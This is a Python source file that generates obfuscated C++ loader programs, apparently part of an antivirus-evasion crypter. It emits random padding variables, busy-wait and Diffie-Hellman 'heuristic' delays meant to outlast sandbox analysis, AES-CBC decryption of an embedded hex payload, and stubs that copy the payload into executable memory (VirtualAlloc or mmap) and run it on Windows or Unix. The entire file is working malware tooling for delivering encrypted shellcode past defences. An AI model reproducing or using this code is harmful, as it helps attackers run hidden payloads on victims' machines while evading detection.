"""
Create the various code segments for the C program
"""

# Add headers
def cHeaders():
  headers = ""
  headers += "#define _CRT_SECURE_NO_DEPRECATE\n"
  headers += "#define _CRT_SECURE_NO_WARNINGS\n"
  headers += "#define CRYPTOPP_DEFAULT_NO_DLL\n"
  headers += "#define CRYPTOPP_ENABLE_NAMESPACE_WEAK 1\n"
  headers += "\n"
  headers += "#include \"stdafx.h\"\n"
  headers += "#include <stdlib.h>\n"
  headers += "#include <time.h>\n"
  headers += "#include <ctype.h>\n"
  headers += "#include <iostream>\n"
  headers += "#include <sstream>\n"
  headers += "#include <stdexcept>\n"
  headers += "#include \"hex.h\"\n"
  headers += "#include \"des.h\"\n"
  headers += "#include \"default.h\"\n"
  headers += "#include \"aes.h\"\n"
  headers += "#include \"twofish.h\"\n"
  headers += "#include \"ccm.h\"\n"
  headers += "#include \"assert.h\"\n"
  headers += "#include \"filters.h\"\n"
  headers += "#include \"cryptlib.h\"\n"
  headers += "#include \"osrng.h\"\n"
  headers += "#include \"integer.h\"\n"
  headers += "#include \"nbtheory.h\"\n"
  headers += "#include \"dh.h\"\n"
  headers += "#include \"secblock.h\"\n"

  return headers

def execHeaderStub(execFunc, execParam):
  execStub = ""
  execStub += "#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)\n"
  execStub += "#include <windows.h>\n"
  execStub += "DWORD WINAPI " + execFunc + "(LPVOID " + execParam + ");\n"
  execStub += "#else\n"
  execStub += "#include <sys/mman.h>\n"
  execStub += "#include <sys/wait.h>\n"
  execStub += "#include <unistd.h>\n"
  execStub += "#endif\n"

  return execStub

def randVarsAndData(paddingVars, genVar, genData):
  # Initiate payload padding
  paddingPayload = ''
  paddingLoop = 0

  # Loop through random values, set random padding variables and initialize their values
  while paddingLoop < paddingVars:
    paddingPayload += 'unsigned char ' + genVar() + str(paddingLoop) + '[]="' + genData() + '";\n'
    paddingLoop += 1

  return paddingPayload

# Create timer function without sleep
def delayTime(heuristicFunc, heuristicTimer, diffieDelay, diffieFunc, currentTime, dh, rnd, bits, count, p, q, g, v, e, msg1, msg2):
  diffieAddition = ""

  if diffieDelay == 1:
    diffieAddition = ("""void %(diffieFunc)s()
{
    AutoSeededRandomPool %(rnd)s;
    unsigned int %(bits)s = 1024;

    try
    {
        DH %(dh)s;
        %(dh)s.AccessGroupParameters().GenerateRandomWithKeySize(%(rnd)s, %(bits)s);

        if(!%(dh)s.GetGroupParameters().ValidateGroup(%(rnd)s, 3))
            throw std::runtime_error("%(msg1)s");

        size_t %(count)s = 0;

        const Integer& %(p)s = %(dh)s.GetGroupParameters().GetModulus();
        %(count)s = %(p)s.BitCount();
		
        const Integer& %(q)s = %(dh)s.GetGroupParameters().GetSubgroupOrder();
        %(count)s = %(q)s.BitCount();

        const Integer& %(g)s = %(dh)s.GetGroupParameters().GetGenerator();
        %(count)s = %(g)s.BitCount();

        Integer %(v)s = ModularExponentiation(%(g)s, %(q)s, %(p)s);
        if(%(v)s != Integer::One())
            throw std::runtime_error("%(msg2)s");
    }

    catch(const CryptoPP::Exception& %(e)s)
    {
    }

    catch(const std::exception& %(e)s)
    {
    }
}\n\n""" % locals())

  if diffieDelay == 1:
    heuristicTimeFunc = ("""void %(heuristicFunc)s(clock_t %(currentTime)s)
{
    %(diffieFunc)s();

    while ((int)(clock() - %(currentTime)s) < %(heuristicTimer)s*1000) {
        if ((int)(clock() - %(currentTime)s) < %(heuristicTimer)s*1000) {
        }
    }
}\n""" % locals())
  else:
    heuristicTimeFunc = ("""void %(heuristicFunc)s(clock_t %(currentTime)s)
{
    while ((int)(clock() - %(currentTime)s) < %(heuristicTimer)s*1000) {
        if ((int)(clock() - %(currentTime)s) < %(heuristicTimer)s*1000) {
        }
    }
}\n""" % locals())

  return diffieAddition + heuristicTimeFunc

# int main()
def mainStub(st, timerFunc, decrypted, encodedKey, key, encodedIv, iv, decodedCipher, ssp, aespayload, aesDecryption, cbcDecryption, stfDecryptor, virtAllocFuncVar):
  mainVar = ("""int _tmain(int argc, _TCHAR* argv[])
{
  clock_t %(st)s = clock();
  %(timerFunc)s(%(st)s);

  std::string %(decrypted)s;
  std::string %(encodedKey)s = "%(key)s";
  std::string %(encodedIv)s = "%(iv)s";
  std::string %(decodedCipher)s;

  StringSource %(ssp)s(%(aespayload)s, true,
    new HexDecoder(
      new StringSink(%(decodedCipher)s)
    )
  );

  AES::Decryption %(aesDecryption)s(reinterpret_cast<const byte*>(%(encodedKey)s.c_str()), AES::DEFAULT_KEYLENGTH);
  CBC_Mode_ExternalCipher::Decryption %(cbcDecryption)s( %(aesDecryption)s, reinterpret_cast<const byte*>(%(encodedIv)s.c_str()) );
  StreamTransformationFilter %(stfDecryptor)s(%(cbcDecryption)s, new StringSink( %(decrypted)s ) ,BlockPaddingSchemeDef::PKCS_PADDING);
  %(stfDecryptor)s.Put( reinterpret_cast<const unsigned char*>( %(decodedCipher)s.c_str() ), %(decodedCipher)s.size() );
  %(stfDecryptor)s.MessageEnd();

  %(virtAllocFuncVar)s(%(decrypted)s);

  exit(0);
}\n""" % locals())

  return mainVar

def virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, len, pid, code, addr, page_size, execFuncVar, execParamVar):
  virtualAllocVar = ("""int %(virtAllocFuncVar)s(std::string %(virtAllocFuncParam)s)
{
  size_t %(len)s;

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
  DWORD %(pid)s;
  char *%(code)s;
#else
  int *%(addr)s;
  size_t %(page_size)s;
  pid_t %(pid)s;
#endif

  %(len)s = (size_t)%(virtAllocFuncParam)s.length();

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
  %(code)s = (char *) VirtualAlloc(NULL, %(len)s+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  strncpy(%(code)s, %(virtAllocFuncParam)s.c_str(), %(len)s);
  WaitForSingleObject(CreateThread(NULL, 0, %(execFuncVar)s, %(code)s, 0, &%(pid)s), INFINITE);
#else
  %(pid)s = fork();

  if(%(pid)s<0)
    return 1;

  if(%(pid)s==0)
  {
    %(page_size)s = (size_t)sysconf(_SC_PAGESIZE)-1;
    %(page_size)s = (%(len)s+%(page_size)s) & ~(%(page_size)s);
    %(addr)s = mmap(0, %(page_size)s, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANON, 0, 0);

    if (%(addr)s == MAP_FAILED)
      return 1;

    strncpy((char *)%(addr)s, %(virtAllocFuncParam)s, %(len)s);
    ((void (*)(void))%(addr)s)();
  }

  if(%(pid)s>0)
    waitpid(%(pid)s, 0, WNOHANG);
#endif
  return 0;
}

#if defined(_WIN64)
void __%(execFuncVar)s(LPVOID);

DWORD WINAPI %(execFuncVar)s(LPVOID %(execParamVar)s)
{
  __try
  {
    __%(execFuncVar)s(%(execParamVar)s);
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
  }

  return 0;
}
#elif defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
DWORD WINAPI %(execFuncVar)s(LPVOID %(execParamVar)s)
{
  __try
  {
    __asm
    {
      mov eax, [%(execParamVar)s]
      call eax
    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
  }

  return 0;
}
#endif
\n""" % locals())

  return virtualAllocVar